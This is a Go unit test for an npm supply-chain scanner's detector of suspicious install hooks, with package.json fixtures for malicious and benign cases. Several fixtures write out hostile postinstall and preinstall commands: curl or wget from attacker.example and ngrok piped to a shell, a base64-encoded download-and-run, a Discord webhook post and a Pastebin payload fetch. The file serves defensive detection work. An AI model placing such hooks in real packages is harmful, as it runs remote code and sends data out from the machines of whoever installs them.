package heuristics

import (
	"testing"

	"github.com/qwexvf/aegis-cli/internal/domain"
)

// TestDetectSuspiciousInstallHook hits the canonical malware patterns
// observed in real npm incidents.
func TestDetectSuspiciousInstallHook(t *testing.T) {
	tests := []struct {
		name     string
		manifest string
		want     domain.Capability
	}{
		// --- positive cases (real-world malware shapes) ---
		{
			name: "curl pipe sh — event-stream / ua-parser-js style",
			manifest: `{
				"name": "totally-legit",
				"scripts": {
					"postinstall": "curl -sSL http://attacker.example/payload | sh"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "wget pipe bash",
			manifest: `{
				"scripts": {
					"preinstall": "wget -O- https://example.com/x | bash"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "node -e inline eval",
			manifest: `{
				"scripts": {
					"install": "node -e \"require('child_process').exec('curl ...')\""
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "python -c",
			manifest: `{
				"scripts": {
					"postinstall": "python3 -c 'import urllib.request; urllib.request.urlretrieve(\"...\")'"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "base64 piped to shell",
			manifest: `{
				"scripts": {
					"postinstall": "echo Y3VybCBodHRwczovL2F0dGFja2VyLmNvbXxiYXNo | base64 -d | sh"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "Discord webhook in install hook",
			manifest: `{
				"scripts": {
					"postinstall": "curl -X POST https://discord.com/api/webhooks/111/aaa -d ..."
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "Pastebin fetch",
			manifest: `{
				"scripts": {
					"postinstall": "wget https://pastebin.com/raw/abc123 -O /tmp/p"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "ngrok tunnel",
			manifest: `{
				"scripts": {
					"install": "curl http://abc.ngrok.io/payload | sh"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},

		// --- negative cases (legitimate hooks) ---
		{
			name: "no scripts at all",
			manifest: `{
				"name": "x",
				"version": "1.0.0"
			}`,
			want: 0,
		},
		{
			name: "node-gyp rebuild (the most common legit postinstall)",
			manifest: `{
				"scripts": {
					"postinstall": "node-gyp rebuild"
				}
			}`,
			want: 0,
		},
		{
			name: "patch-package",
			manifest: `{
				"scripts": {
					"postinstall": "patch-package"
				}
			}`,
			want: 0,
		},
		{
			name: "husky install",
			manifest: `{
				"scripts": {
					"prepare": "husky install"
				}
			}`,
			want: 0,
		},
		{
			name: "node --eval CI-skip guard then husky (real-world: @colordx/core)",
			manifest: `{
				"scripts": {
					"prepare": "node --eval \"if (process.env.CI) process.exit(0)\" && husky || true"
				}
			}`,
			want: 0,
		},
		{
			name: "node -e short benign one-liner",
			manifest: `{
				"scripts": {
					"prepare": "node -e \"process.exit(0)\""
				}
			}`,
			want: 0,
		},
		{
			name: "node -e with require still flagged",
			manifest: `{
				"scripts": {
					"postinstall": "node -e \"require('https').get('https://x.com/p')\""
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "node -e with very long opaque body still flagged",
			manifest: `{
				"scripts": {
					"postinstall": "node -e \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOP\""
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "mention of curl in test script doesn't count (test isn't install-time)",
			manifest: `{
				"scripts": {
					"test": "curl localhost | jest"
				}
			}`,
			want: 0,
		},
		{
			name:     "broken JSON returns 0 silently",
			manifest: `{`,
			want:     0,
		},

		// Mini Shai-Hulud / TanStack 2026 patterns
		{
			name: "tanstack-2026 — bun run localfile && exit 1 in prepare",
			manifest: `{
				"scripts": {
					"prepare": "bun run tanstack_runner.js && exit 1"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "bun run localfile && exit 0 in postinstall",
			manifest: `{
				"scripts": {
					"postinstall": "bun run setup.js && exit 0"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "npx run localfile && exit 1 in postinstall",
			manifest: `{
				"scripts": {
					"postinstall": "npx run payload.mjs && exit 1"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "deno run localfile && exit 1 in postinstall",
			manifest: `{
				"scripts": {
					"postinstall": "deno run payload.ts && exit 1"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "bun run localfile without && exit still flagged",
			manifest: `{
				"scripts": {
					"postinstall": "bun run install_hook.js"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "bun install in prepare — legitimate dependency install",
			manifest: `{
				"scripts": {
					"prepare": "bun install"
				}
			}`,
			want: 0,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := DetectSuspiciousInstallHook([]byte(tc.manifest))
			if got != tc.want {
				t.Errorf("DetectSuspiciousInstallHook = %v, want %v", got, tc.want)
			}
		})
	}
}
